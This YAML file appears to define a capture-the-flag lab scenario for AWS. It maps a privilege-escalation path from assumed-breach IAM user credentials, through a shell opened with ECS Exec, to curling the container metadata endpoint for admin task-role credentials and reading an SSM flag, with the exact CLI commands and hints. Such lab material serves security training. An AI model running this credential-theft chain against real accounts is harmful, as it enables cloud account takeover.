attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-006-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has ecs:ExecuteCommand and ecs:DescribeTasks permissions on the
        ECS cluster, allowing it to shell into running containers.

    - id: ecs-task
      label: "ECS Task Container"
      type: resource
      subType: ecs-task
      arn: "arn:aws:ecs:{region}:{account_id}:task/pl-prod-ecs-006-to-admin-cluster/*"
      description: >
        A running ECS task in the pl-prod-ecs-006-to-admin-cluster cluster. ECS Exec is
        enabled on this task, and it runs with an admin task role attached via the instance
        profile. Once inside the container, the task role credentials are accessible from
        the container metadata service endpoint.

    - id: target-role
      label: "Admin Task Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-006-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess and is attached as the task role to the
        running ECS container. By retrieving its temporary credentials from the metadata
        service inside the container, you now have full administrative access to the
        AWS account. These credentials are then used to read the scenario's CTF flag
        from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ecs-006-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin credentials extracted from the ECS task metadata service.

  edges:
    - from: starting-principal
      to: ecs-task
      label: "ecs:ExecuteCommand + ecs:DescribeTasks"
      description: >
        Use ecs:ExecuteCommand (backed by SSM Session Manager) to establish an interactive
        shell session inside the running container. The AWS CLI internally calls ecs:DescribeTasks
        to retrieve the container runtime ID needed to establish the session.
      hints:
        - "Use ecs:ExecuteCommand to open an interactive shell on the running task container. You will need the AWS Session Manager plugin installed locally for this to work."
        - "From inside the container, retrieve the task role credentials by curling the ECS container metadata endpoint at 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI. The JSON response contains AccessKeyId, SecretAccessKey, and Token — export all three on your local machine after exiting."
        - "Browse to https://pathfinding.cloud/paths/ecs-006 for full technique details."
      commands:
        - description: "List ECS clusters in the account"
          command: "aws ecs list-clusters"
        - description: "List tasks in the cluster"
          command: "aws ecs list-tasks --cluster pl-prod-ecs-006-to-admin-cluster"
        - description: "Describe the task to find the container name and task definition"
          command: "aws ecs describe-tasks --cluster pl-prod-ecs-006-to-admin-cluster --tasks <task-arn>"
        - description: "Describe the task definition to confirm the admin task role"
          command: "aws ecs describe-task-definition --task-definition <task-definition-arn>"
        - description: "Shell into the container"
          command: "aws ecs execute-command --cluster pl-prod-ecs-006-to-admin-cluster --task <task-arn> --container sleep-container --interactive --command \"/bin/sh\""

    - from: ecs-task
      to: target-role
      label: "curl metadata service"
      description: >
        From inside the container, query the ECS container metadata service to retrieve
        the temporary credentials for the task role. These credentials are then used
        outside the container to operate as the admin role.
      hints: []
      commands:
        - description: "Retrieve task role credentials from inside the container"
          command: "curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
        - description: "Verify admin access using the extracted credentials (run outside container)"
          command: "AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> aws iam list-users"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With the admin task role credentials extracted from the container metadata service,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin credentials you just obtained.
      hints:
        - "Use ssm:GetParameter with the full parameter path to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store using the stolen admin credentials"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ecs-006-to-admin --query 'Parameter.Value' --output text"
